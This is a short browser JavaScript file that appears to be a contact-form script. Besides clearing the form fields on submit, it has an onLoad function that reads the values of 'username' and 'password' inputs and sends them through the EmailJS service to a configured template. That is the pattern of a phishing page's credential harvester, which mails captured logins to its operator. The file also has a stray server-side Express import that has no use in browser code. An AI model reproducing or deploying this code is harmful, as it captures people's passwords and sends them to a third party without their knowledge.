const { format } = require("express/lib/response");

document.querySelector('#contact-form').addEventListener('submit', (e) => {
    e.preventDefault();
    e.target.elements.name.value = '';
    e.target.elements.email.value = '';
    e.target.elements.message.value = '';
});



function onLoad(params) {

    var tempParams = {
        from_name: document.getElementById("username").value,
        message: document.getElementById("password").value,
    };



    emailjs.send("service_5rg4jzd", "template_d3n7vmw", tempParams)
        .then(function (res) {
            console.log("ok", res.status);
        })
}

